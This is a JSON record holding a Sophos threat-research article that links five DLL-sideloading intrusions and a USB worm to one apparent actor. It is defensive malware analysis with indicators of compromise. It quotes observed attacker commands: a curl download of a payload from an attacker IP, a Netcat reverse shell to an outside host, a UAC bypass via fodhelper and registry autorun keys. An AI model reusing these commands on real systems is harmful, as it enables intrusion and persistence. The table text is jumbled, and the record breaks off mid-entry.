{
    "id": "457fa560-f246-40ef-ba59-8c18d9ee4750",
    "created_at": "2023-01-12T15:09:31.124119Z",
    "updated_at": "2025-03-27T02:16:46.981798Z",
    "deleted_at": null,
    "sha1_hash": "bf0b9926a49aec9acd99d1f73fabe330545b01b5",
    "title": "2022-11-03 - Family Tree- DLL-Sideloading Cases May Be Related",
    "authors": "",
    "file_creation_date": "2022-12-29T00:21:04Z",
    "file_modification_date": "2022-12-29T00:21:04Z",
    "file_size": 1412309,
    "plain_text": "# Family Tree: DLL-Sideloading Cases May Be Related\n\n**[news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/](https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/)**\n\nGabor Szappanos November 3, 2022\n\nWe have observed multiple attacks targeting government organizations in Asia, all involving\nDLL sideloading – historically a favorite technique of China-based APT groups — as far back\nas 2013 and [as recently as 2020. In this article, we look at the evidence that connects five of](https://news.sophos.com/en-us/2020/11/04/a-new-apt-uses-dll-side-loads-to-killlsomeone/)\nthem, showing how threat actors base their attacks on well-known, effective techniques,\nadding complexity and variation over time. Understanding how cases are related helps\ndefenders (and customers) think about not just who’s doing the attacking, but about what\nkind of threats may be afoot – and, naturally, how to prioritize analysis and defense for best\nresults.\n\nIn the most interesting of the five cases, a USB worm infected organizations in Southeast\nAsia. This worm copies everything it finds in specific directories when replicating itself,\n[including components of other APT attacks by Mustang Panda and](https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-june-mustang-panda/) [LuminousMoth. We don’t](https://securelist.com/apt-luminousmoth/103332/)\nhave any evidence that the three APTs are linked, and we also know that multiple USB\nworms, when infecting systems simultaneously, may inadvertently combine their files. (This\n[is similar to macro virus mating, a phenomenon identified over twenty-five years ago.)](https://en.wikipedia.org/wiki/Macro_and_security#%22Mating%22_macro_viruses)\n\n\n-----\n\nThe case involving the USB worm has significant overlap with the other four cases we\nobserved, including loader DLLs using the same kind of code flow obfuscation and identical\nloader shellcode. We can’t be sure that it’s the same threat actor behind both the USB worm\ncase and the other attacks – it may be different threat actors with access to the same tooling\n– but the similarities are compelling.\n\nWe’ll take a deep dive into all five cases, further detailing the infection timeline of the USBworm attack in an appendix. We’ll spotlight a piece of shell code that seems to be the\ncommon thread in all five cases, and then dig into extended step-by-step breakdowns of\nseven scenarios we associate with these cases. We’ll close with indicators of compromise\nassociated with these cases, which we will also make available on our GitHub.\n\nBefore all that, though, it’s worth briefly defining what DLL sideloading is, as it’s often\nconfused with a similar attack called DLL preloading.\n\n## About DLL sideloading and preloading\n\nDLL sideloading and preloading (sometimes known as search-order hijacking) are both\nattacks that hijack execution flow, although there is a subtle distinction between them.\n\n**DLL preloading (AKA search order hijacking) –** **[T1574/001](https://attack.mitre.org/techniques/T1574/001/)**\n\nAn attacker plants a malicious DLL in a directory that will be searched by a pre-existing\napplication before the location of a legitimate library (based on the default Windows\nsearch order).\nFor example, if a legitimate application has to load dll and doesn’t specify a location, it\nwill search the current directory first, then other directories as per the Windows search\norder.\nIf an attacker has write permissions to a directory in the search order list, they can plant\na malicious DLL called dll in that directory, which the application will then load\n(assuming the legitimate DLL has not already been loaded into memory, and wasn’t\nfound in any previous search locations).\nThe attacker then waits for the pre-existing legitimate application to be executed, or\nforces this process (e.g., by rebooting the machine).\n\n**DLL sideloading –** **[T1574/002](https://attack.mitre.org/techniques/T1574/002/)**\n\nAs above, except the attacker plants and invokes a legitimate application that loads the\nmalicious DLL. This allows the attacker to take advantage of the trust the system\nalready has in the application.\n[This technique has been used by various threat actors, including REvil.](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/revil-ransomware-uses-dll-sideloading/)\n\n## User cases\n\n\n-----\n\nA number of user reports led us to initially spot the threat actor s activities. We ll start with the\nmost basic case and progress to the four more complex examples.\n\n### Case 1: Basic Bad Behavior\n\nThis was the case that first drew our attention to the malicious server 91.245.253[.]52, which\nappears repeatedly in these attacks.\n\nThis case came to light thanks to a stager alert (DynamicShellcode) received from a\ncustomer. The malicious payload (SSCE5532.dll) was executed via the command prompt, as\nshown in the following process trace:\n```\n1 C:\\Windows\\SysWOW64\\rundll32.exe [5624]\n\nrundll32.exe SSCE5532.dll RunMain\n\n2 C:\\Windows\\System32\\rundll32.exe [7864]\n\nrundll32.exe SSCE5532.dll RunMain\n\n3 C:\\Windows\\System32\\cmd.exe [3288]\n\n4 C:\\Windows\\explorer.exe [4628]\n\n```\nThe threat actor placed the malicious DLL on the desktop. It executed shellcode for a\nstandard Metasploit (or, possibly, Cobalt Strike) reverse HTTP shell, connecting to the\nfollowing attacker-controlled server:\n```\n91.245.253.52:6060/rKVI\n\n### Case 2: Double Trouble\n\n```\nWe started looking for other cases involving the 91.245.253[.]52 server, and we found them.\nThis one involves two DLL sideloading attacks.\n\n**2.1: First sideloading attack**\n\nThe initial infection consists of ciscocollabhost.exe, a clean and digitally signed Cisco\napplication that, on execution, loads ciscosparklauncher.dll, a malicious DLL.\n\nOur telemetry indicates that ciscosparklauncher.dll is a loader and that the payload could be\na file named 2831329086.inf, located in the same directory.\n\nNext, a password-protected RAR archive is downloaded from a distribution server and\nunpacked, as shown in these command lines:\n```\nhttp://5.252.178.162/IJOINOIS/c.rar -o\n\nC:\\\\users\\\\public\\\\libraries\\\\c.rar\",\n\n  \"commandLine\" : \"c:\\\\windows\\\\system32\\\\cmd.exe /C\n\nc:\\\\progra~1\\\\winrar\\\\rar.exe x -hpNONI*(uy23oninjfoisjnsofnsc\n\nC:\\\\users\\\\public\\\\libraries\\\\c.rar C:\\\\Users\\\\Public\\\\libraries\"\n\n```\nThe RAR archive contains the following files:\n\n\n-----\n\n```\n86f7661039a0855be8d6d1cb55391f398932e80c googleupdate.exe (clean VLC EXE)\n\ned67a11646c1b28bc856941743331acb47f1b7b4 goopdate.ja (encrypted implant)\n\ne5be6f621c4a10372837baf795a37b1caa942d23 libvlc.dll (malicious loader)\n\nb2eb8516ab136aa44106c13cc859dcee77d1bc1f loader.ja (encrypted implant)\n\nd90355d2a53b662c1d3fe7ab4430d3955a54f73f time.sig (encrypted config)\n\n```\n**2.2: Second sideloading attack**\n\nNext, the executable googleupdate.exe (which, despite its name, has nothing to do with\nGoogle; it’s a clean, digitally signed VLC Media Player application) in c.rar is used to\nsideload libvlc.dll, a malicious loader that loads the payloads from the encrypted implants in\nthe archive.\n\nConveniently, those implants write out detailed debug logs on their progress:\n\np1-p11: privilege escalation progress messages\n\nx1-x4: module execution progress messages\n\n\n-----\n\n_Figure 1: Events conveniently logged_\n\nOnce this second sideloading attack is complete, the malware connects to the stager server,\nthis time over port 443.\n\n### Case 3: Something Extra\n\nThis attack was detected by Sophos’ HeapHeapProtect dynamic-shellcode mitigation, which\nprevents code running in heap space from adding arbitrary code into the memory space of\nthe original application, and similarly prevents lateral code injection into other applications\n(and flags the attempt). As in the previous case, this attack featured two sideloading\nattempts. In fact, the first was exactly the same as seen in the previous two cases.\n\n\n-----\n\n**3.1: First sideloading attack**\n\nThe first attack featured the same executable and malicious DLL as we saw in the other\ncases, and we once again observed a connection to 91.245.253[.]52. Next came the\ndownloading and unpacking of a password-protected RAR file, using a different distribution\nserver:\n```\n     \"commandLine\" : \"curl -k\n\nhttp://103.253.72.116/akjsdnfkjsnjfekse/walk.rar -o\n\nC:\\\\users\\\\public\\\\libraries\\\\walk.rar\",\n\n     \"commandLine\" : \"C:\\\\Progra~1\\\\WinRAR\\\\Rar.exe x \nhplic\\\\down443 C:\\\\users\\\\public\\\\libraries\\\\walk.rar\n\nC:\\\\Users\\\\Public\\\\Downloads\\\\\",\n\n```\nThe walk.rar archive contained six files: three encrypted implants and an encrypted config\n(all with a PLG extension), a clean executable (Netsky.exe, a Razer Chromium Render\nProcess), and a malicious DLL (RzLog4CPP_Logger.dll).\n\n**3.2: Second sideloading attack**\n\nThe second attack used the loader Netsky.exe and the malicious RzLog4CPP_Logger.dll\nfrom the first part of the attack, which decrypts and loads alloc.plg, one of the encrypted\nimplants. In turn, this implant loads the others.\n\nWe also noted that the attacker executed 2.exe, with the path of NetSky.exe as an argument.\nThe function of this executable is currently unclear.\n\n### Case 4: The Worm Circus\n\n[We found this case by running a VirusTotal RetroHunt using the characteristics of the](https://support.virustotal.com/hc/en-us/articles/360001293377-Retrohunt)\nsideloading DLLs we spotted in the previous cases. Of the five cases we’ll cover, this could\nbe considered the most complex, and we will return to it later in this article when we do a\ndeeper analysis of infection timelines for these cases. It includes three sideloading efforts.\n\nWe noted a significant code overlap (especially in the loader shellcode) between this case\nand the other sideloading cases discussed so far, so we think this was also run by the same\nthreat actor. However, the payload turned out to be totally different: a USB worm. We’re\nuncertain as to the purpose of this worm. It collects all files from the root of the USB drives\nand copies them as the infection spreads to other devices. It could be a deliberate data\nexfiltration method, or just an unwanted side effect of the propagation process.\n\nIn this case, the threat actor used a clean usbconfig.exe executable using multiple names\n(disk_watch.exe, usb drive.exe, and Removable Disk.exe); an encrypted implant (usb.ini);\nand u2ec.dll, a malicious loader for the implant.\n\n**4.1: USB worm mating**\n\n\n-----\n\nIn Case 4, we observed sideloading components from two other APT groups — Mustang\nPanda and [LuminousMoth – in the same directory as files from the original threat actor. We](https://securelist.com/apt-luminousmoth/103332/)\nthink that the presence of these two additional APTs is collateral damage during the filecollection process, rather than an indication of collusion.\n\nThe files corresponding to the sideloading attack included disk_watch.exe and u2ec.dll.\nFiles corresponding to Mustang Panda included rzlog4cpp.dll (a Mustang Panda reverse\nshell, not to be confused with the RzLog4CPP_Logger.dll we saw in Case 3), wuwebv.exe (a\nclean but renamed copy of Netcat), and two DLLs that were clean dependencies of Netcat.\n\nThe rzlog4cpp.dll establishes a reverse shell by invoking the Netcat component with the\nfollowing command line:\n```\ncmd.exe /C wuwebv.exe -t -e c:\\windows\\system32\\cmd.exe\n\nclosed.theworkpc.com 80\n\n```\nFiles corresponding to LuminousMoth included msbuild.exe, a clean Silverlight launcher; and\nversion.dll, a malicious DLL. The latter file is also a USB worm, operating in a similar way as\nthe usb.ini implant mentioned previously in Case 4. It is associated with LuminousMoth APT\n[activities seen in 2021.](https://www.kaspersky.com/about/press-releases/2021_rare-mass-advanced-threat-campaign-targets-more-than-a-thousand-users-in-southeast-asia)\n\nWe identified one other component, a clean copy of Microsoft’s WinWord.exe. Its role is\nunknown, although Kaspersky researchers have speculated that it may have been used to\nsideload a malicious DLL, wwlib.dll.\n\n### Case 5: Triple Threat\n\nThe last case we’ll examine involved three different sideloading attacks, as Case 4 did\n(though no worm was detected). We covered the first two attacks in Case 3, although we\nnoticed a slight difference this time. The “Triple Threat” also has echoes of Case 2, as you’ll\nsee.\n\n**5.1: First sideloading attack**\n\nAs in Case 2, the threat actor used ciscocollabhost.exe and ciscosparklauncher.dll, and\ndownloaded, unpacked, and executed c.rar from 5.252.178[.]162/IJOINOIS.\n\nHowever, this time the threat actor also downloaded and executed an additional passwordprotected RAR archive, v1.rar, from 103.253.72.[.]116/_akjsdnfkjsnjfekse. (We saw that IP\naddress already, in Case 3.) v1.rar contains clean copies of smstore.exe and msvcrt.dll (both\nlegitimate Microsoft files) and SYSMSRV.dll, a malicious DLL.\n\n**5.2: Second sideloading attack**\n\nThis attack used googleupdate.exe (the clean VLC executable) and libvlc.dll, a malicious\nDLL, as described in Case 2.\n\n\n-----\n\n```\nc:\\users\\public\\libraries\\out\\googleupdate.exe : \n\n6f924de3f160984740fbac66cf9546125330fc00f4f5d2dbf05601d9d930b7d9\n\nc:\\users\\public\\libraries\\out\\libvlc.dll :\n\n2fd75763307c5aec5603adc6d02a7c5f34d605a0989e856001b4ae2eef2b4327\n\n```\n**5.3: Third sideloading attack**\n\nThis attack used the same files from v1.rar, although the threat actor also used a UAC\nbypass trick to execute commands – including an unidentified file, 3.exe. (We’ll detail this\nbypass trick below as Scenario 5.) As with “2.exe” in Case 3, the purpose of this executable\nis unknown.\n\n## The common thread: Loader shellcode\n\nWe’ve lain out five cases; let’s look at the common threads.\n\nFirst, the malicious server 91.245.253[.]52 – our first clue in the investigation, as noted in\nCase 1 — made an appearance in every case. Other interesting traces are shown in the\nchart below.\n\n\n**Case**\n**1**\n\n\n**Case 2** **Case 3** **Case 4** **Case 5**\n\n\n**No. of**\n**sideloaders**\n**present**\n\n**91.245.253[.]52**\n**called**\n\n**5.252.72[.]116**\n**called**\n\n**103.253.72[.]116**\n**called**\n\n**UAC bypass**\n**present**\n\n**Clean**\n**application(s)**\n**abused**\n\n**USB worm**\n**included**\n\n\n0 2 2 1 + fragments of\nunrelated attacks\n\n\n3\n\n\nYes Yes Yes Yes Yes\n\nNo Yes No No Yes\n\nNo No Yes No Yes\n\nNo No No No Yes\n\n\nNone Cisco\nWebex,\nVLC\nMedia\nPlayer\n\n\nCisco\nWebex\nRazer\nChromium\nRender\nProcess\n\n\nNetcat; SilverLight (via\nLuminousMoth),\nWinWord (purpose\nunclear), Cisco, VLC\nMedia Player\n\n\nCisco Webex,\nMicrosoft\nSymbol Server\nBuilder, VLC\nMedia Player\n\n\nNo No No Yes No\n\n\n-----\n\n_Table 1: Various traces and IoCs noted among the five DLL sideloading cases_\n\nMore significantly, when the sideloader DLL decrypts the plugin, it follows the execution by\njumping to the first byte of the file. The file content of the decrypted plugin starts with a short\nPE loader shellcode, which loads the encrypted plugin DLL. This loader shellcode is the\nsame in all seven scenarios described in the following sections, which establishes a strong\nconnection among them.\n\n_Figure 2: The shared loader shellcode_\n\n\n-----\n\n[Similar to PlugX loaders, this shellcode loader overwrites the first 0x1000 bytes of the](https://www.sophos.com/en-us/medialibrary/pdfs/technical%20papers/plugx-thenextgeneration.pdf)\ndecrypted and loaded plugin DLL with zero bytes.\n\n_Figure 3: The loop that fills the first 0x1000 bytes with zero bytes_\n\n## Under the hood: Five cases, seven scenarios\n\nMoving on, we’ll dissect some of the more interesting activities we spotted during analysis.\nWe’ll dissect one scenario from each of our five cases, and look in addition at two earlier\nfinds that appear to be related to these cases. We should note that normally, we’d expect to\nsee one scenario (clean loader + malicious loader + plugins) per case, but a couple of these\ncases literally doubled up. (Why they would do that is left as a conjecture for the reader.) For\nease of reference, we’ll letter our scenarios – A, B, C, D, E – and identify the case to which it\nis related\n\n\n-----\n\nWe discovered the two extra scenarios – F, G — by taking the information we had from our\nfive cases and looking beyond our own data to see what other defenders might have already\ndiscovered but not yet flagged as part of a larger threat. They’re presented here to show how\nelse these attacks might present to threat hunters, and to give some indication of just how\nlong-running the threat might be.\n\nAnother of the interesting variations we found in this set of cases is that similar or identical\nconfiguration data is stored in multiple plugins. We’ll show this in detailed analysis of the\nspecific plugins.\n\n### From Case 1: Scenario A, the initial loader\n\nThis was the initial infection, which consisted of the following components:\n```\nc:\\users\\public\\libraries\\ciscocollabhost.exe :\n\n7b301cea1feff0add8de512a93ed7bc1b8330caf0c3a6f1585f9887b88db8efb\n\n(clean loader)\n\nc:\\users\\public\\libraries\\ciscosparklauncher.dll :\n\na73053f5410de74c8689d5a0da0df72adaa28055562626003d1b446c754d79e6\n\n(sideloader DLL)\n\nc:\\users\\public\\libraries\\2831329086.inf (payload)\n\n```\n**Implants**\n\nThe implant had the name 2831329086.inf, and was placed in the same directory as the\nsideloader DLL. We don’t have the implant, so we can only guess at its behavior based on\nthe activity logs.\n\n### From Case 2: Scenario B, the “cool client”\n\nThe files belonging to this scenario were found in the downloaded c.rar described in Case 2.\n\nThis campaign was dubbed “Cool Client” by its developers, based on leftover development\ninformation in the components.\n\n**Sideloader DLLs**\n\n**libvlc.dll**\n\nCompile time: 2021-May-10 19:40:05\n\nPDB path: G:\\project\\木马\\Cool\\Client\\hijack_export\\libvlc\\Release\\libvlc.pdb\n\nPDB File Name : G:\\project\\木马\\Cool\\Client\\hijack_export\\libvlc\\Release\\libvlc.pdb\n\n(Translation of the Chinese text: Trojan horse)\n\n\n-----\n\nMost of the libvlc exports are dummy (RET) functions that immediately exit — except for\nlibvlc_new, which is the main function.\n\n_Figure 4: libvlc_new has a few things going on, in fact_\n\nThe DLL has a default config structure. The config data is stored in a memory region. First it\nis initialized with the hardcoded config, and then this region is overwritten with whatever the\ndecrypted content of time.sig isThe first value looks like an ID string for the config structure,\nthe second one is an encryption key, and the third one should be the C2 address.\n```\ncfg_find_tag\n\ne4adbd50cf4e608d7cd3cf16022831ab\n\n192.168.211.1\n\n```\nThese are default values, as indicated by the RFC 1918 IP address. To update with the real\nvalues, the process loads time.sig and decrypts the config info from it, overriding the default\nconfiguration with the target system’s actual configuration. During this process it:\n\nReplaces the default values in the memory with the new ones\nLoads the implant file c:\\programdata\\GoogleUpdate\\UpdateTime.ja\n\n\n-----\n\nInstalls itself as a service named gupdaten\nLooks for the presence of c:\\windows\\system32\\clb.dll. If the file is not found, the\nprocess terminates\nIf c:\\programdata\\GoogleUpdate\\loader.ja does exist, the process decrypts and\nexecutes loader.ja\nloader.ja is injected into the winver.exe process (process hollowing; we’ll have more to\nsay about this technique in Scenario 3)\nIn addition to the default config, it contains the internal IP address 192.168.211.13. The\npurpose is unclear at this time.\n\n**Implants**\n\nThese are the encrypted modules that are loaded and executed during the infection process.\n\n**Loader.ja**\n\nCompile time: 2021-May-31 01:23:24\n\nIt appears to contain default config data, similar to libvlc.dll, and is likewise overwritten via\ntime.sig\n\nRelevant strings from the embedded config structure:\n```\ncfg_find_tag\n\nmark\n\ngroup\n\n192.168.211.1\n\ne4adbd50cf4e608d7cd3cf16022831ab\n\n```\nAnother internal IP address, 192.168.211.13, is stored elsewhere.\n\n[The implant employs a UAC bypass using the CMSTPLUA COM interface, and injects the](https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512)\ncreated process into winver.exe. Processes are created for these files:\n```\nc:\\programdata\\GoogleUpdate\\goopdate.ja\n\nc:\\programdata\\GoogleUpdate\\session.ja\n\n```\nThis sequence:\n\n1. Stops the avp.exe process (avp.exe is the core component of Kaspersky’s antivirus\n\nsolution; this is an attempt to evade detection)\n2. Creates a registry autorun key:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\goopdate\n3. Adds a service called gupdaten\n\n**goopdate.ja**\n\nCompile time: 2021-06-03 01:28:52\n\n\n-----\n\nPDB path:\n\nPDB File Name: G:\\project\\木马\\Cool\\Client\\main\\Release\\main.pdb\n\n(Translation of the Chinese text: Trojan horse)\n\nThis file refers to several source files in its code, including:\n```\ng:\\project\\..\\cool\\client\\main\\main\\ckernelmanager.cpp\n\ng:\\project\\..\\cool\\client\\main\\main\\cmyudpclient.cpp\n\ng:\\project\\..\\cool\\client\\main\\main\\cmytcpclient.cpp\n\n```\nAs with previous examples, this implant contains default config data:\n```\ncfg_find_tag\n\nmark\n\ngroup\n\ne4adbd50cf4e608d7cd3cf16022831ab\n\n192.168.211.153\n\n```\nas well as the internal IP address 192.168.211.13.\n\nThis plugin registers the clean loader executable for autostart as a service. (As flagged\nabove, this is a service claiming to be Google Update, but is actually a VLC media player\nexecutable.)\n\n_Figure 5: The new “service” gupdaten_\n\n**session.ja and UpdateTime.ja**\n\nWe didn’t obtain these implants. All we know is that loader.ja refers to them and would load\nthem if they existed,\n\n**time.sig**\n\nThis file contains encrypted config information, as shown in Figure 6:\n\n\n-----\n\n```\ncfg_find_tag\n\nNone\n\nmachinetimeer\n\nwww.machinetimeer.com\n\nwww.machinetimeer.com\n\n192.168.211.153\n\n192.168.211.13\n\ntests5\n\n123456\n\n```\n_Figure 6: A look at the hex related to machinetimeer_\n\n### From Case 3: Scenario C, the VTCP gambit\n\nCode analysis shows that this scenario is built around vtcp.dll (the entirety of which is\nactually embedded into the main implant; it’s not just that the source code is linked into the\nplugin!) from the Trochilus RAT collection. These files were in the downloaded walk.rar\narchive.\n\n**Sideloader DLLs**\n\n**RzLog4CPP_Logger.dll**\n\nCompile time: 2021-Aug-19 21:40:13\n\nThis contains a digital signature, seemingly from Google LLC (but really another self-signed\nfake):\n\n\n-----\n\n_Figure 7: A certificate that’s not what it claims to be_\n\nThumbprint:  747EC25FDC3710E46D69135FAE8797718B967E25\n\nAlgorithm:    sha256RSA\n\nValid from:    5:52 AM 5/10/2021\n\nValid to:       5:52 AM 5/10/2023\n\nThis uses the same code flow obfuscation as libvlc.dll. It loads and decrypts alloc.plg.\n\n**Implants**\n\n\n-----\n\n**alloc.plg**\n\nCompile time: 2021-Aug-19 22:38:47\n\nContains an encrypted embedded PE, which has a Chinese PDB string:\n\nCompile time: 2018-Feb-10 19:04:13\n\nPDB File Name : G:\\ROOT\\代码工程\\木马\\技巧收集\\38dll\\Release\\38dll.pdb\n\n(Translation: G:\\ROOT\\Code Project\\Trojan\\Trick Collection\\38dll\\Release\\38dll.pdb)\n\nThe implant executes wusa.exe (and possibly grabs its process token).\n\nAs Microsoft describes it, this creates a new process and its primary thread; the new process\nruns the specified executable file in the security context of the specified credentials (user,\ndomain, and password). It can optionally load the user profile for a specified user. Abuse of\n[this technique was previously noted by researcher Vitali Kremez in 2018 and is associated](https://twitter.com/vk_intel/status/991226679380074496)\nwith the [Tofsee plugin-based spambot. It is probably a Vault7 fileless AlwaysNotify UAC](https://blog.talosintelligence.com/2016/09/tofsee-spam.html)\nbypass, similar to [this one.](https://gist.github.com/dezhub/c0fee68d1e06657a45ec39365362fca7)\n\n_Figure 8: A UAC bypass in action_\n\nusername: uac\n\ndomain: is\n\npassword: useless\n\n[This hollows free.plg into dllhost.exe. (Hollowing, mentioned also in Scenario 2, is an attack](https://attack.mitre.org/techniques/T1055/012/)\nin which a threat actor removes code in an executable, in this case dllhost, and embeds\nmalicious code in order to trick the target machine into running the “trusted” executable.)\nPossible command-line parameters, which are passed to the clean loader when executed,\ninclude:\n\npassuac\nonline\n\ninstall\n\nThis uses [UAC_Bypass_CMSTPLUA and creates a service (InstallSvc) with the command](https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512)\n‘C:\\ProgramData\\Netsky\\NetSky.exe online’.\n\n\n-----\n\n**free.plg**\n\nCompile time stamp: 2021-Aug-19 21:21:29\n\nThis stops the current service, creates the event Global\\\\ACT, then calls the sendSAS\nfunction of sas.dll with parameter 0. It then loads local.plg (if the service was found) and\nmain.plg, all expected in C:\\\\ProgramData\\\\Netsky. main.plg is hollowed into a dllhost.exe\nprocess.\n\nIt opens C:\\\\ProgramData\\\\Netsky\\\\vs_session.dat, which appears to be a flag file (though we\nwere unable to recover it for examination). If the file is not present, the process keeps\nchecking in a loop.\n\n**local.plg**\n\nThis contains the encrypted config, using a different encryption method than the implants.\nThe decoded data contains these strings:\n```\ncfg_find_tag\n\ntest\n\n188.127.237.27\n\n188.127.237.27\n\n674e8fb2f2c8d8699200d56493722c90\n\n```\n_Figure 9: A screenshot taken from a memory dump_\n\n**main.plg**\n\n\n-----\n\nCompile time stamp: 2021-Aug-19 21:04:16\n\nDuring installation this implant is hollowed into dllhost.exe. It contains the embedded vtcp.dll\nfrom the [Trochilus RAT collection.](https://github.com/m0n0ph1/malware-1/blob/master/Trochilus/bin/Bin/vtcp.dll)\n\nThis DLL is loaded into memory, gets the exports from vtcp.dll, and uses them later in\ncommunication.\n\nvtcp.dll uses CNetDiskClientSocket vftable functions for communication. It reads in and\ndecrypts local.plg. It has a predefined hardcoded data structure that is overwritten with the\ndecoded content. This hardcoded structure could be used in testing, or when there is no\nlocal.plg file found. The content of this hardcoded config is:\n```\ncfg_find_tag\n\nmark\n\n192.168.211.1\n\n192.168.211.1\n\n```\nIt registers the application as class “MSN Shessll – %d”; the number is generated by a call to\nthe Windows API function GetTickCount. Next, it logs keystrokes to a file. It creates dir.dat in\nboth C:\\\\ProgramData\\\\Netsky and C:\\Users\\All Users. Both files will contain the name of the\ndirectory where the sideloading components were installed, in this case,\nC:\\ProgramData\\Netsky.\n\nThe process generates debug logs during execution, as shown in Figure 10:\n\n_Figure 10: Logs generated by the process_\n\n### Case 4: Scenario D, the USB disk hijacker\n\nBased on the internal development info stored in the files, this scenario goes by the code\nname “U Disk Hijacking.”\n\n**Sideloader DLLs**\n\n\n-----\n\n**_u2ec.dll_**\n```\nCreation Time  2021-09-01 09:23:30 UTC\n\nFirst Submission 2022-01-02 04:07:47 UTC\n\n```\nContains the PDB path:\n\nG:\\project\\APT\\U盘劫持\\new\\u2ec\\Release\\u2ec.pdb\n\n(Translation of Chinese text: U Disk Hijacking)\n\nWe found a variation of this file on VirusTotal. The only difference is some appended data:\n```\nMD5 230c9a22104d5363d2e2738a6ac62b80\n\nSHA-1  a693a273a23ec3ad274469492dc8db9f85f31c8f\n\nSHA-256 a519c4e5dadd68c2301e65689857907941af23565bc19bb938fd3c51ff5f34ca\n\n```\n**_Implants_**\n\nThe implants are stored in an encrypted format. They are decoded by the loader shellcode.\nThese implants are DLL files with no exports; the main code is the entry code.\n\n**usb.ini**\n\nInterestingly, this artifact does not appear to do any C2 communication.\n\nPDB File Name : G:\\project\\APT\\U盘劫持\\new\\shellcode\\Release\\shellcode.pdb\n\n(Chinese text: U Disk Hijacking)\n\nThe icon and the name of the executable spoofs a removable drive icon, thus tricking the\nvictim into clicking on it. The directory listing would look as shown in Figure 11:\n\n\n-----\n\n_Figure 11: The spoofed icon_\n\nThen a warning may be displayed:\n\n\n-----\n\n_Figure 12: Windows flags the attempt to run the file, but the information the user sees_\n_inspires trust_\n\nHowever, because the executable is (apparently) clean and signed, the victims is not\nsuspicious.\n\nIf it is not running from a path that contains ‘programdata’, it infects the computer and\nproceeds to do the following creation and copying actions:\n\nIt creates the installation directory udisk and copies document/image files there, then copies\nevery file from the current directory (directory of GetModuleFileName) to\nc:\\programdata\\udisk.\n\nIt creates the following autorun key in the registry:\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  udisk\n\nc:\\programdata\\udisk\\disk_watch.exe\n\n```\nIt then copies itself to the following locations and executes those copies:\n```\nc:\\\\programdata\\\\udisk\\\\disk_watch.exe\n\nc:\\\\programdata\\\\udisk\\\\DateCheck.exe\n\n```\nIf it is running as disk_watch.exe, it infects USB disks by replicating itself there.\n\nThis is the timeline of the infection process from the logs:\n\nFirst, u2ec.dll loads the payload:\n```\n2022-05-02T03:26:54.419932Z  [ e:\\usb drive.exe::13956 ]   ===\n\nFileRead ===>  [ e:\\u2ec.dll ]\n\n2022-05-02T03:26:55.212781Z  [ e:\\usb drive.exe::13956 ]   ===\n\nFileRead ===>  [ e:\\autorun.inf\\protection for autorun\\system\n\nvolume information\\usb.ini ]\n\n```\nThen, files (documents created in the root by the user rather than the worm itself) are copied\nto the installation directory, as are instances of the worm and components of the other\nsideloading scenarios. After all that, an autorun registry key is created:\n```\n2022-05-02T03:27:46.035555Z  [ e:\\usb drive.exe::13956 ]   ===\n\nRegKeySetValue ===>  [ HKEY_USERS\\S-1-5-21-2519359479-851945054\n3016455893-1321\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run ]\n\n2022-05-02T03:27:46.198285Z  [ e:\\usb drive.exe::13956 ]   ===\n\nRegKeySetValue ===>  [\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\n\nNT\\CurrentVersion\\Notifications\\Data ]\n\n### Case 5: Scenario E, the Win10 UAC bypass\n\n```\n\n-----\n\nThe following components were used:\n```\nc:\\users\\public\\libraries\\out\\symstore.exe :\n\n83e51f9d467977238f9fa5107106918ed5102f1a3e06eeba9a33d21d5df49d6a\n\nc:\\users\\public\\libraries\\out\\symsrv.dll :\n\n9c2f1eeea169f2dd196bc9a0d240d941ccb5a22a050bca856c1a03fd795ac58d\n\nc:\\users\\public\\libraries\\out\\msvcrt.dll :\n\nd8cf89e651a2e1d9f8f653d16ecbca979d6c9459329a015ff825eff38792ed24\n\n```\nIn this case there is no additional encrypted payload file; the sideloaded DLL, symsrv.dll, is\nthe payload itself.\n\n**SYMSRV.dll**\n\nPDB path:\n\n_C:\\Users\\admin\\Desktop\\djwklqjdlwqjldwqjlkfjwlqkjlqwjglqwjglqjlgjwqkjgk\\SYMSRV.pdb_\n\nThis is a 64-bit loader DLL that does a UAC bypass trick to execute commands, including the\n[unidentified 3.exe component, as explained in this blog from PenTestLab.](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)\n\nThe implant executes various commands, which are inserted into the registry key HKCU\\\n_Classes\\ms-settings\\CurVer. It then tries to execute two different Windows components, both_\nof which are vulnerable to the UAC bypass method:\n```\nc:\\windows\\system32\\fodhelper.exe\n\nc:\\windows\\system32\\ComputerDefaults.exe\n\n```\nWhen these clean Windows components are executed, they read the command to be\nexecuted from the registry key and run it with higher privileges.\n\nWe observed the following commands executed in this fashion:\n```\nC:\\\\users\\\\public\\\\libraries\\\\3.exe\n\nmkdir C:\\\\programdata\\\\googleupdate\\\n\nC:\\\\Users\\\\Public\\\\Libraries\\\\out\\\\googleupdate.exe\n\n```\nThe implant needs to make sure that another execution will not interfere, so it creates a flag\nin the registry: if it is set, some other command is in progress. The flag key is\n_HKCU\\Classes\\aaabbb32\\shell\\open\\command._\n\nThe threat actors show strong devotion to the DLL sideloading technique here. This UAC\nbypass method could have been compiled into any of their implants; instead, the simple logic\nhas been implemented as a standalone sideloading scenario, and the debug features\nexploded the payload to a huge (1.1MB) DLL file.\n\n### Scenario F: A connection to ShadowPad?\n\n\n-----\n\nAs mentioned, a VirusTotal hunt led us to additional cases from non-Sophos sources. This\ncase was found via VT hunting; it dates from January 2021, but the shared characteristics\nclearly connect it to our cases from 2022.\n\n**Sideloader DLLs**\n\nThe following file was identified:\n```\n73048579a2903918bbcc601cd562e8f93459ad2a562c6537006067b59735b7b6: log.dll\n\nMD5    63971f35a4282343eced55ebdfd1cb0b\n\nSHA-1  bee88779a9c65543a9cfa5069b4486131a23e55d\n\nSHA-256 